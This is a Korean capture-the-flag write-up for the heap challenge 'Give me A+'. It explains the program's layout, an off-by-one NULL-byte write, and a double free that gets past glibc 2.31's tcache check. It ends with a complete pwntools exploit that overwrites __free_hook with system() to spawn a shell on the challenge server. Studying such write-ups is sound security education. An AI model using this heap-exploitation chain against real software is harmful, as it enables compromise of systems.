# Give me A+

:black_nib:N1be(csj.n1be@gmail.com)

---

## libc version

힙 익스플로잇을 위해서는 바이너리가 돌아가고 있는 서버에 적용되어 있는 libc 파일의 버전을 알아야 합니다. 문제에서 주어진 libc 파일에서 함수의 오프셋을 libc database search에 넣어보면 glibc 2.31 버전임을 알 수 있습니다.

<br>

---

## analysis

코드가 어떻게 동작하는지 이해하려면 먼저 학생의 정보를 관리하는 구조체부터 파악해야 합니다. 프로그램에서 관리하는 학생의 정보는 두 가지인데, 기본 정보(이름, 나이)와 과목별 성적입니다.

<br>

![image](https://user-images.githubusercontent.com/59759771/98449968-cb462d00-217b-11eb-910b-b1c28ddea388.png)

add()에서는 우선 학생의 정보를 저장할 청크를 할당받습니다. 할당 요청 크기는 `0x28 * (num_subjects + 1)`입니다. 첫 `0x28`바이트에는 이름과 나이가 저장되고, 그 다음부터 `0x28`바이트마다 각 과목의 성적이 저장됩니다.

<br>

![image](https://user-images.githubusercontent.com/59759771/98450015-50c9dd00-217c-11eb-82de-06803af87f07.png)

`cnt`는 현재 몇 명의 학생이 관리되고 있는지를 나타냅니다. `students`는 전역 변수이고, 청크들의 주소가 이 전역 변수에 저장되어 관리됩니다. 사용자는 학생의 정보를 삭제하거나 수정할 때, index를 입력해서 `students[index]`의 형식으로 청크에 접근할 수 있습니다.

<br>

![image](https://user-images.githubusercontent.com/59759771/98450069-c46bea00-217c-11eb-8456-0d93b208cd58.png)

`dest`에는 학생의 이름이 저장되고, `(char *)dest + 0x24`에는 나이가 저장됩니다.

<br>

![image](https://user-images.githubusercontent.com/59759771/98450279-e9615c80-217e-11eb-97f3-e7dcc10580f2.png)

성적을 입력하는 부분입니다. `input_grade()`는 과목명과 점수를 입력받는 함수인데, 첫 번째 인자가 과목명, 두 번째 인자가 점수입니다. 청크에서 과목 이름이 뒤쪽에 위치한다는 것을 잘 기억해둡시다.

<br>

---

## vulnerability

### poison NULL byte

![image](https://user-images.githubusercontent.com/59759771/98450596-39412300-2181-11eb-88b2-1686ed999936.png)

학생의 이름과 과목명을 입력받을 때 사용되는 `read_line()` 함수입니다. 버퍼의 주소와 길이를 인자로 받아서 `fgets()`로 문자열을 입력받는데, 마지막에 NULL byte를 삽입하는 과정에서 문자열 길이 계산을 잘못해서 off-by-one 취약점이 발생합니다. 만약 `strlen(buf) == len`이라면 `buf[len + 1] = 0;`이 실행됩니다. 문자열 범위의 끝으로부터 한 바이트나 두 바이트 벗어난 위치에 NULL byte를 임의로 삽입할 수 있습니다.

앞에서 학생의 성적을 저장할 때 과목명이 점수보다 뒤쪽에 위치하는 것을 확인했습니다. 과목의 개수를 적절히 조절하면, 청크에서 마지막 과목의 과목명을 다음 청크와 인접하게 만들 수 있습니다. 그러면 off-by-one을 이용하여 다음 청크의 사이즈의 하위 1바이트를 0으로 덮을 수 있게 됩니다.

<br>

### double free bug

![image](https://user-images.githubusercontent.com/59759771/98450878-e3ba4580-2183-11eb-9d1e-f3f35007e578.png)

`delete()`에서 학생의 정보를 삭제할 때, 청크는 free시키는데 `students`에 저장된 청크 포인터는 삭제하지 않습니다. `modify()`에서 학생의 이름은 수정할 수 없으니 UAF를 통한 fd나 bk overwrite는 불가능하고, 이미 free된 청크에 다시 접근해서 한 번 더 free시키는 것은 가능합니다.

<br>

glibc 2.31에는 glibc 2.27과 달리 티캐시에서 double free를 방지하기 위한 보안 검사가 추가되었습니다.

```c
        /* Check to see if it's already in the tcache.  */
        tcache_entry *e = (tcache_entry *) chunk2mem (p);
        /* This test succeeds on double free.  However, we don't 100%
           trust it (it also matches random payload data at a 1 in
           2^<size_t> chance), so verify it's not an unlikely
           coincidence before aborting.  */
        if (__glibc_unlikely (e->key == tcache))
          {
            tcache_entry *tmp;
            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
            for (tmp = tcache->entries[tc_idx];
                 tmp;
                 tmp = tmp->next)
              if (tmp == e)
                malloc_printerr ("free(): double free detected in tcache 2");
            /* If we get here, it was a coincidence.  We've wasted a
               few cycles, but don't abort.  */
          }
```

malloc.c의 `_int_free()`에서 double free를 검사하는 루틴입니다. 같은 티캐시 엔트리 내에서 링크드 리스트를 따라가면서 현재 free하려고 하는 청크와 같은 청크가 있는지 검사합니다. 이 검사는 같은 티캐시 엔트리 내에서만 이루어지기 때문에, free된 청크의 사이즈를 조작하고 다시 free시키면 각각 다른 티캐시 엔트리로 들어가게 되어 보안 검사를 우회할 수 있습니다.

<br>

---

## exploit

```python
from pwn import *

r = process("./give_me_A+")
# r = remote("srv.cykor.kr", 31003)

def add(name, age, number_of_subjects):
    r.sendlineafter("[+] input menu.\n", 'a')
    r.sendlineafter("[+] input name.\n", name)
    r.sendlineafter("[+] input age.\n", str(age))
    r.sendlineafter("[+] input number of subjects.\n", str(number_of_subjects))

def input_grade(subject_name, score):
    r.sendlineafter("[+] input subject name.", subject_name)
    r.sendlineafter("[+] input score.", str(score))

def delete(index):
    r.sendlineafter("[+] input menu.\n", 'd')
    r.sendlineafter("[+] input student index.\n", str(index))

def print_info(index):
    r.sendlineafter("[+] input menu.\n", 'p')
    r.sendlineafter("[+] input student index.\n", str(index))

def modify(index):
    r.sendlineafter("[+] input menu.\n", 'm')
    r.sendlineafter("[+] input student index.\n", str(index))
```

<br>

### libc leak

먼저 libc의 주소를 릭해봅시다. unsorted bin에 들어간 청크의 fd와 bk에 `main_arena+96`의 주소가 저장되는 것을 이용하여 릭을 할 수 있습니다.

```python
# libc leak
for i in range(8):
    add("N1be", 21, 13)
    for j in range(13):
        input_grade("", 100)

for i in range(8):
    delete(7 - i)

print_info(0)
r.recvuntil("[+] name: ")
libc = u64(r.recvn(6).ljust(8, b'\x00')) - 0x1ebbe0 # libc base
log.info("libc base: " + hex(libc))
```

![image](https://user-images.githubusercontent.com/59759771/98457108-bf805800-21c7-11eb-9d41-d73a44cd10ac.png)

<br>

### double free

`add()`에서 `malloc()`의 인자로 들어가는 `alloc_size`는 `0x28 * (num_subjects + 1)`이었습니다. `num_subjects`가 5이면 `malloc(0xf0)`이 실행되어 `0x100` 크기의 청크가 반환되고, `num_subjects`가 6이면 `malloc(0x118)`이 실행되어 `0x120` 크기의 청크가 반환됩니다.

<br>

```python
# double free
add("N1be", 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("N1be", 21, 6) # index: 1
for i in range(6):
    input_grade("", 100)

delete(1)
modify(0)
for i in range(5):
    input_grade("", 100)
input_grade('a' * 0x1f, 100) # poison NULL byte
delete(1) # double free
```

`0x120` 크기의 청크를 두 개 할당받고 뒤쪽 청크를 free시킵니다. poison NULL byte를 발생시켜서 뒤쪽 청크의 사이즈를 `0x100`으로 조작하고 다시 free시키면 다음과 같은 상태가 됩니다.

![image](https://user-images.githubusercontent.com/59759771/98460454-f6fefc80-21e7-11eb-94dc-1c93703678cc.png)

<br>

### free hook overwrite

double free된 청크의 fd를 조작하여 free hook 영역에 페이크 청크를 할당받을 수 있습니다.

<br>

```python
add(p64(freehook), 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)
```

먼저 `0x120` 크기의 청크를 하나 할당받고 이름에 free hook의 주소를 저장합니다. 그러면 다음과 같은 상태가 됩니다.

![image](https://user-images.githubusercontent.com/59759771/98460460-041beb80-21e8-11eb-93ec-63cac78c3008.png)

![image](https://user-images.githubusercontent.com/59759771/98460473-14cc6180-21e8-11eb-9803-e480956daffc.png)

`tcache_entry[14]`에 free hook의 주소가 들어가있는 것을 확인할 수 있습니다. 이 상태에서 `0x100` 크기의 청크 2개를 할당받으면 free hook 영역의 페이크 청크가 사용자에게 반환될 것입니다. 이때 주의할 점은 티캐시에 2개 이상의 청크가 저장되어 있어야 합니다. 앞의 사진에서 `tcache_entry[14](1)`은 티캐시에 청크가 1개만 있음을 의미합니다. 이런 경우 fd를 조작했더라도 시스템은 티캐시에 청크가 1개만 있다고 판단해서, 2번째 할당 요청을 보냈을 때는 티캐시에서 꺼내주지 않고 새로운 청크를 할당합니다.

<br>

페이크 청크를 제대로 할당받았다면, free hook을 `system()`의 주소로 덮을 수 있습니다. 그리고 나서 `"/bin/sh"`가 적힌 청크를 free시키면 `system("/bin/sh")`가 실행되어 쉘을 획득할 수 있습니다.

<br>

---

## full exploit

```python
from pwn import *

# r = process("./give_me_A+")
r = remote("srv.cykor.kr", 31003)

offset_freehook = 0x1eeb28 # offset of free hook from libc base
offset_system = 0x55410 # offset of system() from libc base

def add(name, age, number_of_subjects):
    r.sendlineafter("[+] input menu.\n", 'a')
    r.sendlineafter("[+] input name.\n", name)
    r.sendlineafter("[+] input age.\n", str(age))
    r.sendlineafter("[+] input number of subjects.\n", str(number_of_subjects))

def input_grade(subject_name, score):
    r.sendlineafter("[+] input subject name.", subject_name)
    r.sendlineafter("[+] input score.", str(score))

def delete(index):
    r.sendlineafter("[+] input menu.\n", 'd')
    r.sendlineafter("[+] input student index.\n", str(index))

def print_info(index):
    r.sendlineafter("[+] input menu.\n", 'p')
    r.sendlineafter("[+] input student index.\n", str(index))

def modify(index):
    r.sendlineafter("[+] input menu.\n", 'm')
    r.sendlineafter("[+] input student index.\n", str(index))

# libc leak
for i in range(8):
    add("N1be", 21, 13)
    for j in range(13):
        input_grade("", 100)

for i in range(8):
    delete(7 - i)

print_info(0)
r.recvuntil("[+] name: ")
libc = u64(r.recvn(6).ljust(8, b'\x00')) - 0x1ebbe0 # libc base
log.info("libc base: " + hex(libc))
freehook = libc + offset_freehook # address of free hook
system = libc + offset_system # address of system()

# double free
add("N1be", 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("N1be", 21, 6) # index: 1
for i in range(6):
    input_grade("", 100)

add("N1be", 21, 5) # index: 2
for i in range(5):
    input_grade("", 100)
delete(2)

delete(1)
modify(0)
for i in range(5):
    input_grade("", 100)
input_grade('a' * 0x1f, 100) # poison NULL byte
delete(1) # double free

# allocate fake chunk on free hook
add(p64(freehook), 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("/bin/sh", 21, 5) # index: 1
for i in range(5):
    input_grade("", 100)

add(p64(system), 21, 5) # index: 2
for i in range(5):
    input_grade("", 100)

# get shell
delete(1) # system("/bin/sh")

r.interactive()
```

![image](https://user-images.githubusercontent.com/59759771/98462881-c8d6e800-21fa-11eb-8145-6b9a0fc65bd1.png)